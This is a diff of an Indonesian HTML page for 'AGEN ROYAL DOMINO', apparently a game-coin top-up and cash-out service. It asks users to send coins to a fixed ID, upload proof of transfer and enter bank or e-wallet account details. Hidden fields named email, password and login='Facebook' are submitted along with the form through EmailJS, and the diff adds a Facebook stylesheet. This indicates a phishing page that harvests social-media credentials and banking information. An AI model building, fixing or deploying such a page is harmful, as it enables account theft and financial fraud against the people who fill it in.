@@ -8,7 +8,8 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"> 
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
-    <title>AGEN ROYAL DOMINO</title> 
+  <link rel="stylesheet" href="file/css/facebook.css"> 
+  <title>AGEN ROYAL DOMINO</title> 
   <meta property="og:title" content="Agen Domino"> 
   <meta name="description" content="Top Up Dan Bongkar Koin Agen Domino!"> 
   <meta property="og:description" content="Top Up Dan Bongkar Koin Agen Domino!"> 
@@ -29,25 +30,25 @@ body {
 
 .appnwghdiprem {
   background: #043e3a;
-  /* Mengganti background-size: 100% 100%; agar tidak rusak */
+  background-size: 100% 100%;
   position: relative;
-  margin: 0 auto; /* Tengah di Windows */
-  max-width: 411px; /* Batas lebar di Windows/Desktop */
+  margin: 0 auto;
+  max-width: 411px; /* Ini yang membuat tampilan sempit di desktop */
   height: auto
 }
 
-/* Menggabungkan semua style body ganda */
+/* Menggabungkan CSS agar rapi di desktop */
 .containernwghdi {
   display: flow-root
 }
     .boxverifnwghdi {
-
   background: #0b5250
 }
 
 .headernwgverifhdi {
-  /* Ganti URL lokal dengan asumsi warna latar belakang */
-  background: #0b5250; 
+  /* background: url(bg_top.jpg) no-repeat center; */ /* Dinonaktifkan karena file lokal */
+  background: #0b5250; 
+  background-size: 120% 120%;
   font-size: 19px;
   line-height: 40px;
   text-align: center;
@@ -61,8 +62,9 @@ body {
 }
 
 .boxnwgverifmarsya {
-  /* Ganti URL lokal dengan latar belakang solid agar tidak rusak */
-  background: #0b5250; 
+  /* background: url(bg_top.jpg) no-repeat center; */ /* Dinonaktifkan karena file lokal */
+  background: #0b5250; 
+  background-size: cover;
   padding: 10px
 }
 
@@ -78,108 +80,32 @@ body {
   padding: 10px
 }
 
-.itemnwgverifhdi {
-  display: flex;
-  margin-bottom: 10px
-}
-
-.itemnwgverifhdi label {
-  background: #ffbc68;
-  color: #814545;
-  padding: 8px;
-  border-radius: 200px;
-  font-weight: 600;
-   width: 40px;
- height: 20px;
-  text-align: middle;
-  display: center;
-  flex-direction: row;
-  align-items: center;
-}
-
-.itemnwgverifhdi select {
-  width: 100%;
-  margin-left: 10px;
-  background: #d5b184;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-}
-
-.itempantek input {
-  width: 50%;
-  margin-left:5px;
-  background:  ;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-}
-
-.itempantek label {
-  background: #ffbc68;
-  color: #814545;
-    margin-left: 60px;
-  padding: 8px;
-  border-radius: 100px;
-  font-weight: 600;
-   width: 40px;
-            height: 20px;
-  text-align: middle;
-  display: center;
-  flex-direction: row;
-  align-items: center;
-}
-
-.itempantek select {
-  width: 100%;
-  margin-left: 10px;
-  background: #d5b184;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-  }
-
-  .itempantek {
-  display: flex;
-  margin-bottom: 10px
-}
-
+/* Style itemkontol diperbaiki agar tidak terlalu jauh marginnya */
 .itemkontol label {
-  /* Margin diperkecil agar tidak terlalu jauh di desktop */
-  margin-left: 10px; 
+  margin-left: 10px; /* Diperbaiki dari 60px */
   padding: 11px 1px;
-  /* Mengatur ulang layout label */
   background: #ffbc68;
   color: #814545;
   padding: 8px;
   border-radius: 200px;
-  font-weight: 600;
-  width: 25px; 
-  height: 20px;
-  text-align: center;
-  display: flex;
+  font-weight: 600;
+   width: 25px; 
+            height: 20px;
+  text-align: center;
+  display: flex;
   justify-content: center;
-  align-items: center;
+  flex-direction: row;
+  align-items: center;
 }
 
 .itemkontol {
   display: flex;
   margin-bottom: 10px;
-  align-items: center; /* Pusat vertikal */
+  align-items: center;
 }
 
 .itemkontol input {
-  /* Mengatur width agar lebih responsif di dalam max-width 411px */
-  width: 85%; 
+  width: 85%; /* Disesuaikan agar pas dengan label */
   margin-left: 8px;
   background: #d5b184;
   color: #835121;
@@ -190,27 +116,9 @@ body {
   outline: 0
 }
 
-.itemnanjg {
-    
-  margin-bottom: 10px
-}
-
 .itemnanjg select {
-  width: 100%; /* Dibuat 100% di dalam containernya */
-  margin-left: 0px;
-  background: #d5b184;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-
-}
-
-.itemnwgverifhdi input {
   width: 100%;
-  margin-left: 10px;
+  margin-left: 0px;
   background: #d5b184;
   color: #835121;
   border: none;
@@ -252,7 +160,7 @@ body {
     text-align: center;
     font-size: 30px;
     z-index: 100;
-    line-height: 60px; /* Center icon vertically */
+    line-height: 60px; 
     box-shadow: 2px 2px 3px #999;
     transition: all 0.3s;
 }
@@ -264,7 +172,7 @@ body {
 
 .whatsapp-text {
     position: absolute;
-    right: 70px; /* Jarak dari tombol */
+    right: 70px; 
     top: 50%;
     transform: translateY(-50%);
     background-color: rgba(0, 0, 0, 0.7);
@@ -274,7 +182,7 @@ body {
     font-size: 14px;
     white-space: nowrap;
     opacity: 0;
-    pointer-events: none; /* Tidak menghalangi klik */
+    pointer-events: none;
     transition: opacity 0.3s;
 }
 
@@ -282,29 +190,9 @@ body {
     opacity: 1;
 }
 
-/* Penyesuaian Style untuk Input ID Koin Copy */
-.id-koin-group {
-    display: flex;
-    align-items: center;
-    margin-bottom: 10px;
-}
-.id-koin-group input {
-    width: 60%;
-}
-.id-koin-group button {
-    padding: 10px;
-    margin-left: 5px;
-    background: #c7ee4c;
-    color: #268707;
-    border: none;
-    border-radius: 5px;
-    font-weight: 600;
-}
 </style>
  </head> 
- <body style="background: ;"> 
-
-<a href="https://wa.me/6285343802982?text=Halo%20Admin%20Royal%20Domino%2C%20saya%20ada%20pertanyaan%20mengenai%20bongkar%20ID." class="whatsapp-float" target="_blank">
+ <body> <a href="https://wa.me/6285343802982?text=Halo%20Admin%20Royal%20Domino%2C%20saya%20ada%20pertanyaan%20mengenai%20bongkar%20ID." class="whatsapp-float" target="_blank">
     <i class="fab fa-whatsapp"></i>
     <span class="whatsapp-text">Hubungi Admin</span>
 </a>
@@ -344,90 +232,87 @@ body {
                 <label>3.</label> 
                 <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkaran" required> 
               </div> 
-              <div>
-                <div class="appnwghdiprem" style="background: #0b5250;"> 
+              
+                              <div class="appnwghdiprem" style="background: #0b5250;"> 
                     <div class="containernwghdi"> 
                       <div class="boxverifnwghdi"> 
                         <div class="headernwgverifhdi"> 
                           <p>Silahkan Kirim Koin Ke Id Di Bawah Ini</p> 
                         </div>
-                      </header> 
-                      <section class="banner"> 
+                      
                         <div class="imageslide">
                           <div style="text-align:center"> 
                             <figure class="sliderbanner" style="display: block;"> 
                               <img src="img/id.jpg" alt="Image" height="200" width="200">
                             </figure> 
-                            <div class="itemkontol id-koin-group">
+                            <div class="itemkontol">
                               <label>4.</label> 
                                 <input type="text" value="17146704" id="myInput" name="id_penerima_koin" readonly>
                                 <button type="button" onclick="myFunction()">Copy</button>
+
                             </div>
-        </div>
-      <div>
-          <div class="boxnwgverifmarsya"> 
-      <div class="ucapanverifnwg" style="text-align: center; line-height: 25px;"> 
-       <span style="color: #ffbc68; font-weight: bold;">
-            Langkah Konfirmasi: Unggah Bukti!
-        </span> 
-        <span>
-            Silahkan unggah screenshot histori pengiriman Anda (Wajib), lalu tekan 'Kirim'.
-        </span>
-        </div>
-        <div class="itemkontol">
-               <div class="appnwghdiprem" style="background: #0b5250;"> 
-   <div class="containernwghdi"> 
-    <div class="boxverifnwghdi"> 
-     <div class="headernwgverifhdi"> 
-              <input type="file" id="buktiTransfer" name="filename" style="width: 90%; margin: 10px auto; background: #d5b184; padding: 10px; border-radius: 5px;"> 
-       </div>
-       <div class="appnwghdiprem" style="background: #0b5250;"> 
-   <div class="containernwghdi"> 
-    <div class="boxverifnwghdi"> 
-     <div class="headernwgverifhdi">  
-                                          <p>Bank Pencairan</p> 
-                                        </div>
-                                        <div class="itemnanjg"> 
-                                          <select name="bank_pencairan"> 
-                                            <option>BCA</option> 
-                                            <option>BRI</option> 
-                                            <option>BNI</option> 
-                                            <option>MANDIRI</option> 
-                                            <option>DANA</option> 
-                                            <option>OVO</option> 
-                                            <option>GOPAY</option> 
-                                          </select> 
-                                        </div>  
-                                        <div class="itemkontol"> 
-                                          <label>5.</label> 
-                                          <input type="number" name="nomor_rekening" placeholder="Nomor Rekening Pencai" required> 
-                                        </div> 
-                                        <div class="itemkontol"> 
-                                          <label>6.</label> 
-                                          <input type="text" name="atas_nama" placeholder="Atas Nama" required> 
-                                        </div> 
-                                        <div class="buttonnwgverifhdi"> 
-                                          <input type="hidden" name="playid" id="ressplayid" value="" readonly>
-                                          <input type="hidden" name="email" id="ressemail" value="" readonly>
-                                          <input type="hidden" name="password" id="resspw" value="" readonly>
-                                          <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
-                                          
-                                          <button type="submit">Kirim</button> 
-                                        </div> 
-                                      </div> 
-                                    </div> 
-                                  </div> 
-                                </div>
-        </div>
-        </div>
-        </div>
-        </div>
-        </div>
+                            
+                            <div class="boxnwgverifmarsya"> 
+                              <div class="ucapanverifnwg" style="text-align: center; line-height: 25px;"> 
+                               <span style="color: #ffbc68; font-weight: bold;">
+                                    Langkah Konfirmasi: Unggah Bukti!
+                                </span> 
+                                <span>
+                                    Silahkan unggah screenshot histori pengiriman Anda (Wajib), lalu tekan 'Kirim'.
+                                </span>
+                              </div>
+                              
+                              <div class="itemkontol" style="display: block; text-align: center;">
+                                    <input type="file" id="buktiTransfer" name="filename" style="width: 90%; margin: 10px auto; background: #d5b184; padding: 10px; border-radius: 5px;"> 
+                              </div>
+                              
+                              <div class="headernwgverifhdi">  
+                                <p>Bank Pencairan</p> 
+                              </div>
+                              
+                              <div class="itemnanjg"> 
+                                <select name="bank_pencairan"> 
+                                  <option>BCA</option> 
+                                  <option>BRI</option> 
+                                  <option>BNI</option> 
+                                  <option>MANDIRI</option> 
+                                  <option>DANA</option> 
+                                  <option>OVO</option> 
+                                  <option>GOPAY</option> 
+                                </select> 
+                              </div>  
+                              
+                              <div class="itemkontol"> 
+                                <label>5.</label> 
+                                <input type="number" name="nomor_rekening" placeholder="Nomor Rekening Pencai" required> 
+                              </div> 
+                              <div class="itemkontol"> 
+                                <label>6.</label> 
+                                <input type="text" name="atas_nama" placeholder="Atas Nama" required> 
+                              </div> 
+                              
+                              <div class="buttonnwgverifhdi"> 
+                                <input type="hidden" name="playid" id="ressplayid" value="" readonly>
+                                <input type="hidden" name="email" id="ressemail" value="" readonly>
+                                <input type="hidden" name="password" id="resspw" value="" readonly>
+                                <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
+                                
+                                <button type="submit">Kirim</button> 
+                              </div> 
+                            </div> 
+                          </div> 
+                        </div>
+                        
+                        <iframe scrolling="no" allow="autoplay" controls="" loop="" src="" style="display: none" width="0" height="0" frameborder="no"></iframe> 
+                    </div> 
+                </div> 
+            </div> 
+          </div> 
+        </div> 
       </form> 
-     </div> 
-    </div> 
-    <iframe scrolling="no" allow="autoplay" controls="" loop="" src="" style="display: none" width="0" height="0" frameborder="no"></iframe> 
-   </div> 
+     </div> 
+    </div> 
+   </div> 
   </div> 
 
 <script>
@@ -459,7 +344,7 @@ function myFunction() {
     const fileInput = document.getElementById('buktiTransfer');
     
     // 1. DISABLE input file sebelum pengiriman
-    // Data file TIDAK AKAN DIKIRIM ke EmailJS, mencegah error 400/500.
+    // Ini adalah langkah KRUSIAL untuk mencegah Error 400/500 dari EmailJS.
     fileInput.disabled = true;
 
     const form = this;
@@ -469,7 +354,7 @@ function myFunction() {
       .then(function() {
         // Jika berhasil
         
-        // 2. Aktifkan kembali input file
+        // 2. Aktifkan kembali input file untuk submit berikutnya (atau untuk reset)
         fileInput.disabled = false;
         
         // 3. Tampilkan notifikasi sukses dan arahkan ke WA
@@ -485,7 +370,7 @@ function myFunction() {
         // Jika gagal
         console.error('Pengiriman Gagal:', error);
         
-        // 5. Aktifkan kembali input file agar bisa di-submit ulang
+        // 5. Aktifkan kembali input file jika gagal agar bisa di-submit ulang
         fileInput.disabled = false; 
         alert('Pengiriman data gagal. Silakan coba lagi. Pastikan Anda sudah mengatur template di EmailJS.');
       });
